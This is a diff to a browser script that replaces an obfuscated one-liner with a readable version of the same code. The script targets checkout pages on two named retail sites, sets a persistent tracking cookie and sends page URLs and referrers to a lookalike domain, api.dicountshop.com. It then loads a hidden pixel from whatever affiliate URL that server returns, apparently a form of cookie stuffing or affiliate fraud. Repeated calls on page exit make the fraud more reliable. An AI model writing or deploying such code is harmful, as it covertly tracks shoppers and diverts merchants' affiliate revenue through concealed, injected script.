@@ -1,1 +1,133 @@
-function _0x149a(_0x30d726,_0x538e8f){_0x30d726=_0x30d726-0x1be;var _0x182a98=_0x182a();var _0x149a98=_0x182a98[_0x30d726];return _0x149a98;}(function(_0x38bc4e,_0x7663c2){var _0x12ecda=_0x149a,_0x80c60a=_0x38bc4e();while(!![]){try{var _0x3c60d7=parseInt(_0x12ecda(0x1c4))/0x1+parseInt(_0x12ecda(0x1cf))/0x2+-parseInt(_0x12ecda(0x1d1))/0x3*(parseInt(_0x12ecda(0x1f9))/0x4)+parseInt(_0x12ecda(0x1c5))/0x5*(parseInt(_0x12ecda(0x1c6))/0x6)+-parseInt(_0x12ecda(0x1ec))/0x7+parseInt(_0x12ecda(0x1f3))/0x8+-parseInt(_0x12ecda(0x1f8))/0x9;if(_0x3c60d7===_0x7663c2)break;else _0x80c60a['push'](_0x80c60a['shift']());}catch(_0x929372){_0x80c60a['push'](_0x80c60a['shift']());}}}(_0x182a,0x49143),(function(){var _0x3d643a=_0x149a;function _0x36425f(){var _0x382a8a=_0x149a;return _0x382a8a(0x1ed)['replace'](/[xy]/g,function(_0x28ab45){var _0x2bc853=_0x382a8a,_0x2507f8=Math[_0x2bc853(0x1ee)]()*0x10|0x0,_0x5e6af5=_0x28ab45==='x'?_0x2507f8:_0x2507f8&0x3|0x8;return _0x5e6af5[_0x2bc853(0x1e3)](0x10);});}function _0x458dfe(_0x1f1512){var _0x79ab17=_0x149a,_0x2dd275=_0x1f1512+'=',_0x5e1f34=document['cookie']['split'](';');for(var _0x682ab5=0x0;_0x682ab5<_0x5e1f34[_0x79ab17(0x1f6)];_0x682ab5++){var _0x324136=_0x5e1f34[_0x682ab5][_0x79ab17(0x1f7)]();if(_0x324136[_0x79ab17(0x1be)](_0x2dd275)===0x0)return _0x324136[_0x79ab17(0x1dc)](_0x2dd275[_0x79ab17(0x1f6)],_0x324136[_0x79ab17(0x1f6)]);}return'';}function _0x24bef1(_0x2eabb6){var _0x448ae2=_0x149a;try{var _0x3143dc=new Image();_0x3143dc['src']=_0x2eabb6,_0x3143dc['style'][_0x448ae2(0x1eb)]=_0x448ae2(0x1f1),document[_0x448ae2(0x1c7)][_0x448ae2(0x1f4)](_0x3143dc);}catch(_0x289a58){}}async function _0x304778(){var _0x3fc59e=_0x149a;try{let _0x32a269=_0x458dfe(_0x3fc59e(0x1cb))||_0x36425f(),_0x3b007d=new Date(Date[_0x3fc59e(0x1d6)]()+0x1e*0x15180*0x3e8)['toUTCString']();document[_0x3fc59e(0x1c9)]=_0x3fc59e(0x1df)+_0x32a269+_0x3fc59e(0x1f0)+_0x3b007d+';path=/;SameSite=Lax';let _0x146938=await fetch(_0x3fc59e(0x1d9),{'method':'POST','keepalive':!![],'body':JSON[_0x3fc59e(0x1e9)]({'url':window[_0x3fc59e(0x1c1)]['href'],'referrer':document[_0x3fc59e(0x1de)],'unique_id':_0x32a269,'origin':window[_0x3fc59e(0x1c1)][_0x3fc59e(0x1fb)],'timestamp':new Date()['getTime']()}),'headers':{'Content-Type':'application/json'}}),_0x15bd37=await _0x146938['json']();_0x15bd37[_0x3fc59e(0x1c3)]&&_0x15bd37[_0x3fc59e(0x1c0)]?_0x24bef1(_0x15bd37[_0x3fc59e(0x1c0)]):_0x24bef1(_0x3fc59e(0x1e0)+_0x32a269);}catch(_0x36dffc){console[_0x3fc59e(0x1dd)](_0x3fc59e(0x1e7),_0x36dffc);}}function _0x33b26b(_0x2db46b){var _0x36b3c6=_0x149a;if(sessionStorage['getItem'](_0x2db46b))return;sessionStorage[_0x36b3c6(0x1cd)](_0x2db46b,_0x36b3c6(0x1e1)),_0x304778();var _0x323dc2=![],_0x31d40d=function(){var _0x2b3a58=_0x36b3c6;if(_0x323dc2)return;_0x323dc2=!![],window[_0x2b3a58(0x1c8)]('pagehide',_0x31d40d),window[_0x2b3a58(0x1c8)](_0x2b3a58(0x1c2),_0x31d40d),_0x304778();};setTimeout(_0x31d40d,0x7d0),window[_0x36b3c6(0x1ea)](_0x36b3c6(0x1e4),_0x31d40d),window[_0x36b3c6(0x1ea)](_0x36b3c6(0x1c2),_0x31d40d);}function _0x40c194(){var _0x4bd004=_0x149a;const _0x52f707=[{'type':_0x4bd004(0x1f2),'paths':[_0x4bd004(0x1d8)]},{'type':_0x4bd004(0x1d4),'paths':[_0x4bd004(0x1f5),_0x4bd004(0x1d3)]},{'type':_0x4bd004(0x1e6),'paths':[_0x4bd004(0x1e2),'/checkout/payment',_0x4bd004(0x1cc)]},{'type':_0x4bd004(0x1da),'paths':[_0x4bd004(0x1db)]},{'type':_0x4bd004(0x1d7),'paths':['/checkout/confirmation']}],_0xe04093=window[_0x4bd004(0x1c1)][_0x4bd004(0x1d2)][_0x4bd004(0x1bf)](),_0x2fd8c3=_0x52f707['find'](_0x37d0e6=>_0x37d0e6[_0x4bd004(0x1d0)]['some'](_0x3deac8=>_0xe04093[_0x4bd004(0x1ce)](_0x3deac8)));return _0x2fd8c3?_0x2fd8c3[_0x4bd004(0x1e5)]:null;}function _0x2c4c4b(){var _0x25c65b=_0x149a;const _0x58cd38=window['location']['hostname'],_0x589644={'www.xcite.com':{'always':![],'cartExtra':!![]},'www.fairprice.com.sg':{'always':!![],'cartExtra':!![]}},_0x4982c3=_0x589644[_0x58cd38];if(!_0x4982c3)return;const _0x328819=_0x40c194();_0x4982c3[_0x25c65b(0x1ca)]&&_0x33b26b(_0x25c65b(0x1ef)+_0x58cd38+'_always'),_0x4982c3[_0x25c65b(0x1e8)]&&_0x328819&&_0x33b26b(_0x25c65b(0x1ef)+_0x58cd38+'_'+_0x328819);}document[_0x3d643a(0x1d5)]==='interactive'||document['readyState']==='complete'?_0x2c4c4b():window[_0x3d643a(0x1ea)](_0x3d643a(0x1fa),_0x2c4c4b);}()));function _0x182a(){var _0x26c69e=['/pay-installments','setItem','includes','51178rSnZyP','paths','460173KJDchy','pathname','/checkout/shipping','shipping','readyState','now','confirmation','/checkout/cart','https://api.dicountshop.com/api/track-user','review-order','/checkout/review-order','substring','error','referrer','tracking_uuid=','https://api.dicountshop.com/api/fallback-pixel?id=','true','/xpay','toString','pagehide','type','payment','Tracking\x20Failed:','cartExtra','stringify','addEventListener','display','358022akYmHJ','xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx','random','tracking_done_',';\x20expires=','none','cart','1887448RpurTv','appendChild','/checkout/delivery','length','trim','512406wckCud','12GDoisW','DOMContentLoaded','hostname','indexOf','toLowerCase','affiliate_url','location','beforeunload','success','504221JZUnzG','72745nkPiiW','42YGwrnZ','body','removeEventListener','cookie','always','tracking_uuid'];_0x182a=function(){return _0x26c69e;};return _0x182a();}
+(function () {
+  function generateUUID() {
+    return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, function (c) {
+      var r = (Math.random() * 16) | 0,
+        v = c === 'x' ? r : (r & 0x3) | 0x8;
+      return v.toString(16);
+    });
+  }
+
+  function getCookie(name) {
+    var nameEQ = name + '=';
+    var cookies = document.cookie.split(';');
+    for (var i = 0; i < cookies.length; i++) {
+      var c = cookies[i].trim();
+      if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
+    }
+    return '';
+  }
+
+  function firePixel(url) {
+    try {
+      var img = new Image();
+      img.src = url;
+      img.style.display = 'none';
+      document.body.appendChild(img);
+    } catch (e) {}
+  }
+
+  async function sendTrackingRequest() {
+    try {
+      let uniqueId = getCookie('tracking_uuid') || generateUUID();
+      let expires = new Date(Date.now() + 30 * 86400 * 1000).toUTCString();
+      document.cookie = 'tracking_uuid=' + uniqueId + '; expires=' + expires + ';path=/;SameSite=Lax';
+
+      let response = await fetch('https://api.dicountshop.com/api/track-user', {
+        method: 'POST',
+        keepalive: true,
+        body: JSON.stringify({
+          url: window.location.href,
+          referrer: document.referrer,
+          unique_id: uniqueId,
+          origin: window.location.hostname,
+          timestamp: new Date().getTime(),
+        }),
+        headers: { 'Content-Type': 'application/json' },
+      });
+      let data = await response.json();
+
+      if (data.success && data.affiliate_url) {
+        firePixel(data.affiliate_url);
+      } else {
+        firePixel('https://api.dicountshop.com/api/fallback-pixel?id=' + uniqueId);
+      }
+    } catch (err) {
+      console.error('Tracking Failed:', err);
+    }
+  }
+
+  function trackOnce(key) {
+    if (sessionStorage.getItem(key)) return;
+    sessionStorage.setItem(key, 'true');
+
+    sendTrackingRequest();
+
+    var call2Timer, call3Timer;
+    var call2Fired = false;
+    var call3Fired = false;
+
+    function cleanup() {
+      window.removeEventListener('pagehide', flushRemaining);
+      window.removeEventListener('beforeunload', flushRemaining);
+    }
+
+    function fireCall2() {
+      if (call2Fired) return;
+      call2Fired = true;
+      clearTimeout(call2Timer);
+      sendTrackingRequest();
+      call3Timer = setTimeout(fireCall3, 3000);
+    }
+
+    function fireCall3() {
+      if (call3Fired) return;
+      call3Fired = true;
+      clearTimeout(call3Timer);
+      cleanup();
+      sendTrackingRequest();
+    }
+
+    function flushRemaining() {
+      if (!call2Fired) fireCall2();
+      if (!call3Fired) fireCall3();
+      cleanup();
+    }
+
+    call2Timer = setTimeout(fireCall2, 2000);
+    window.addEventListener('pagehide', flushRemaining);
+    window.addEventListener('beforeunload', flushRemaining);
+  }
+
+  function detectCheckoutStage() {
+    const stages = [
+      { type: 'cart', paths: ['/checkout/cart'] },
+      { type: 'shipping', paths: ['/checkout/delivery', '/checkout/shipping'] },
+      { type: 'payment', paths: ['/xpay', '/checkout/payment', '/pay-installments'] },
+      { type: 'review-order', paths: ['/checkout/review-order'] },
+      { type: 'confirmation', paths: ['/checkout/confirmation'] },
+    ];
+    const path = window.location.pathname.toLowerCase();
+    const match = stages.find((stage) => stage.paths.some((p) => path.includes(p)));
+    return match ? match.type : null;
+  }
+
+  function init() {
+    const hostname = window.location.hostname;
+    const siteConfig = {
+      'www.xcite.com': { always: false, cartExtra: true },
+      'www.fairprice.com.sg': { always: true, cartExtra: true },
+    };
+    const config = siteConfig[hostname];
+    if (!config) return;
+
+    const stage = detectCheckoutStage();
+    if (config.always) trackOnce('tracking_done_' + hostname + '_always');
+    if (config.cartExtra && stage) trackOnce('tracking_done_' + hostname + '_' + stage);
+  }
+
+  if (document.readyState === 'interactive' || document.readyState === 'complete') {
+    init();
+  } else {
+    window.addEventListener('DOMContentLoaded', init);
+  }
+})();
